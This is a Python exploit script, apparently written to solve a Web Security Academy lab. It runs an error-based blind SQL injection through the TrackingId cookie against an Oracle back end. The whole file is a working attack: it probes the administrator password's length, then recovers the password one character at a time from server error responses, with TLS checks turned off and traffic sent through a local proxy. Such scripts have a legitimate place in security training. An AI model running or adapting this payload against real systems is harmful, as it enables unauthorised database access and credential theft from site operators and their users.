import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

characters = (
    [chr(i) for i in range(48, 58)]
    + [chr(i) for i in range(65, 91)]
    + [chr(i) for i in range(97, 123)]
)

# Changeable Variables
session = "c31iLTOrZLKlWdidLfOWHmNsLDhEix5L"
TrackingId = "zSK3VXT95TUwvZCJ"

url = "https://0ae900650338d83c81e78e2500130063.web-security-academy.net/"
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def get_password_length():
    print("(+) Getting Password Length")
    pass_len = 0
    for i in range(1, 25):
        payload = f"' AND (SELECT CASE WHEN ((select LENGTH(password) from users WHERE ROWNUM = 1 and username='administrator')={i}) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' -- -"
        cookies = {"TrackingId": TrackingId + payload, "session": session}
        response = requests.get(url, cookies=cookies, verify=False, proxies=proxy)
        # print(response.text)
        if "Internal Server Error" in response.text:
            # print("True")
            pass_len = i
            break
    print(f"Password Length: '{pass_len}'")
    return pass_len


def get_password(password_length):
    print("(+) Getting Password")
    password = ""
    for i in range(1, password_length + 1):
        for j in characters:
            payload = f"' AND (SELECT CASE WHEN ((select SUBSTR(password, {i}, 1) from users where username='administrator' and ROWNUM = 1 ) = '{j}') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' -- -"
            # print(payload)
            # print(i, chr(j))
            cookies = {"TrackingId": TrackingId + payload, "session": session}
            response = requests.get(url, cookies=cookies, verify=False, proxies=proxy)
            if "Internal Server Error" in response.text:
                password += j
                print(f"Password: {password}")
                break
    return password


if __name__ == "__main__":
    password_length = get_password_length()
    password = get_password(password_length)
    print(f"Final Password: '{password}'")
